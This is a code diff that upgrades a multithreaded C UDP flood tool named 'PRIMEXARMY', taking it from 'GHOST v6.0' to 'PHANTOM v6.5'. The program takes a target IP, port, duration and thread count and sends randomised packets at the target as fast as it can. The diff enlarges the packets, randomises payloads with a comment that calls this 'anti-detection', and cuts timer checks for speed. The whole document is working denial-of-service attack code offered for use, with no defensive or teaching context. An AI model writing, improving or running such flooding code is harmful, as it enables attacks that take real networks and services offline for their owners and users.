@@ -7,11 +7,12 @@
 #include <unistd.h>
 #include <time.h>
 #include <fcntl.h>
+#include <netinet/ip.h>
 
-/* ⚔️ PRIMEXARMY v6.0 - GHOST UDP (Non-Blocking) ⚔️ */
+/* ⚔️ PRIMEXARMY v6.5 - PHANTOM UDP (Optimized) ⚔️ */
 
 struct thread_data {
-    char *ip;
+    char ip[16];
     int port;
     int duration;
 };
@@ -23,9 +24,8 @@ void *prime_strike(void *arg) {
     
     if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) return NULL;
 
-    // ✨ FEATURE 1: NON-BLOCKING MODE (बिना रुके पैकेट फायर करना)
+    // ✨ NON-BLOCKING & TOS (Type of Service) for Priority
     fcntl(sock, F_SETFL, O_NONBLOCK);
-
     int tos = 0x10; 
     setsockopt(sock, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));
 
@@ -35,42 +35,42 @@ void *prime_strike(void *arg) {
     server_addr.sin_addr.s_addr = inet_addr(data->ip);
 
     char payload[1024];
-    time_t start_time = time(NULL);
-    time_t end_time = start_time + data->duration;
-    
-    // ✨ FEATURE 2: OPTIMIZED TIME CHECK (CPU पर लोड कम करने के लिए)
+    time_t end_time = time(NULL) + data->duration;
     unsigned long int packet_count = 0;
 
     while (1) {
-        // हर 2000 पैकेट के बाद समय चेक करेगा, जिससे रफ़्तार बनी रहे
-        if (packet_count % 2000 == 0) {
+        // Optimization: Time check every 5000 packets for raw speed
+        if (packet_count % 5000 == 0) {
             if (time(NULL) >= end_time) break;
         }
 
-        for (int i = 0; i < 64; i++) {
-            payload[i] = (char)(rand() % 256);
+        // Randomizing payload every few packets for anti-detection
+        if (packet_count % 10 == 0) {
+            for (int i = 0; i < 64; i++) {
+                payload[i] = (char)(rand() % 256);
+            }
         }
 
-        int packet_size = 64 + (rand() % 448); 
+        int packet_size = 128 + (rand() % 896); // 128 to 1024 bytes
         
         sendto(sock, payload, packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
         packet_count++;
     }
 
     close(sock);
-    return NULL;
+    pthread_exit(NULL);
 }
 
 int main(int argc, char *argv[]) {
     if (argc != 5) {
-        printf("\n   ⚔️  𝗣𝗥𝗜𝗠𝗘𝗫𝗔𝗥𝗠𝗬 𝗚𝗛𝗢𝗦𝗧 𝘃𝟲.𝟬  ⚔️\n");
+        printf("\n   ⚔️  𝗣𝗥𝗜𝗠𝗘𝗫𝗔𝗥𝗠𝗬 𝗣𝗛𝗔𝗡𝗧𝗢𝗠 𝘃𝟲.𝟱  ⚔️\n");
         printf("   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
         printf("   Usage: ./PRIME <ip> <port> <time> <threads>\n\n");
         return 1;
     }
 
     struct thread_data data;
-    data.ip = argv[1];
+    strncpy(data.ip, argv[1], 15);
     data.port = atoi(argv[2]);
     data.duration = atoi(argv[3]);
     int threads = atoi(argv[4]);
@@ -78,16 +78,18 @@ int main(int argc, char *argv[]) {
     pthread_t thread_id[threads];
     srand(time(NULL));
 
-    printf("🚀 [GHOST v6.0] Firing on %s:%d\n", data.ip, data.port);
+    printf("🚀 [PHANTOM v6.5] Strike on %s:%d | Threads: %d\n", data.ip, data.port, threads);
 
     for (int i = 0; i < threads; i++) {
-        pthread_create(&thread_id[i], NULL, prime_strike, &data);
+        if (pthread_create(&thread_id[i], NULL, prime_strike, (void *)&data) != 0) {
+            continue; 
+        }
     }
 
     for (int i = 0; i < threads; i++) {
         pthread_join(thread_id[i], NULL);
     }
 
-    printf("✅ [FINISHED] Strike Over.\n");
+    printf("✅ [FINISHED] Operation Complete.\n");
     return 0;
 }
